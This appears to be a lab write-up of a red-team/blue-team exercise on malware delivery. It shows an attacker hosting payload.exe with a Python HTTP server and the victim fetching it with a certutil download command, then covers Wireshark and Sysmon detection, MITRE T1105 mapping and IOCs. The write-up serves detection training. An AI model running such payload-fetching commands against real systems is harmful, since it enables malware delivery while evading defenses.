# üõ°Ô∏è Scenario 1 ‚Äì Malware Delivery (Ingress Tool Transfer)

## üéØ Objective
Simulate the delivery of a malicious payload (`payload.exe`) from an attacker machine to a victim endpoint over HTTP, and validate the Blue Team‚Äôs detection and monitoring capabilities using network traffic analysis and endpoint telemetry.

---

## üî¥ Red Team Activity

### Steps
1. **Host Malicious Payload on Attacker Machine**:
   - The attacker hosted `payload.exe` on a Kali machine using a simple HTTP server:
     ```bash
     python3 -m http.server 8080
     ```
2. **Download Payload on Victim Machine**:
   - The victim machine downloaded the payload using the built-in Windows utility `certutil`:
     ```bash
     certutil -urlcache -split -f http://192.168.2.129:8080/payload.exe payload.exe
     ```

### Explanation
- The attacker exploited `certutil.exe`, a legitimate Windows tool, to fetch the payload. This is a classic **Living off the Land Binary (LOLBin)** technique, which avoids detection by leveraging native system binaries rather than external download tools that might be blocked or flagged by security software.

### Evidence (Text-Only, No Images)
- **Victim CLI**: Command output showing successful execution of `certutil` to download `payload.exe`.
- **Attacker Terminal**: Kali terminal log indicating a GET request from the victim (optional, based on HTTP server output).

---

## üîµ Blue Team Detection

### Network Traffic Analysis (Wireshark Capture)
- **Filter Applied**: `http.request`
- **Observed Traffic**:
  ```
  GET /payload.exe HTTP/1.1
  Host: 192.168.2.129:8080
  ```
- **Analysis**: This confirms the victim machine initiated an HTTP request to the attacker‚Äôs web server (port 8080) and successfully retrieved `payload.exe`.
- **Evidence (Text-Only, No Images)**: Wireshark log snippet showing the GET request details.

### Endpoint Telemetry (Sysmon Integration)
- **Sysmon Event ID 11 - File Create**: Detects the creation of `payload.exe` on the victim machine.
  - **Relevant Fields**:
    - `TargetFilename`: `C:\path\to\payload.exe` (where the file was saved).
    - `Image`: Process creating the file (e.g., `certutil.exe`).
    - `Computer`: Victim machine hostname.
- **Evidence (Text-Only, No Images)**: Sysmon log entry confirming file creation event.

---

## üß© MITRE ATT&CK Mapping

- **Technique**: T1105 ‚Äì Ingress Tool Transfer
  - **Description**: Adversaries transfer tools or payloads from an external system into a compromised environment.
- **Technique Context**:
  - Delivery method: HTTP over port 8080.
  - Tool used: Native Windows binary `certutil.exe` to minimize detection by traditional antivirus solutions.

---

## üìå Indicators of Compromise (IOCs)

| Type         | Value                     | Notes                                              |
|--------------|---------------------------|----------------------------------------------------|
| Attacker IP  | 192.168.2.129            | Kali machine hosting the malicious payload         |
| Victim IP    | [Insert your victim IP here] | Windows endpoint fetching the payload             |
| File Name    | payload.exe              | Dropped onto the victim system                    |
| File Hash    | [Insert SHA256 hash here] | Generate with: `Get-FileHash payload.exe -Algorithm SHA256` |

---

## ‚úÖ Summary
In this scenario, the attacker successfully delivered `payload.exe` to the victim machine by exploiting the legitimate `certutil.exe` utility. The Blue Team validated the transfer through:
- Network traffic analysis in Wireshark, identifying the HTTP GET request.
- Endpoint telemetry via Sysmon, logging the file creation event.

This exercise highlights the risk of abusing common Windows binaries for initial malware delivery. Defenders must monitor both network traffic (e.g., unusual HTTP requests) and endpoint activity (e.g., Sysmon file creation) to detect such techniques effectively. Regular updates to detection rules and IOC tracking are critical to mitigate these threats.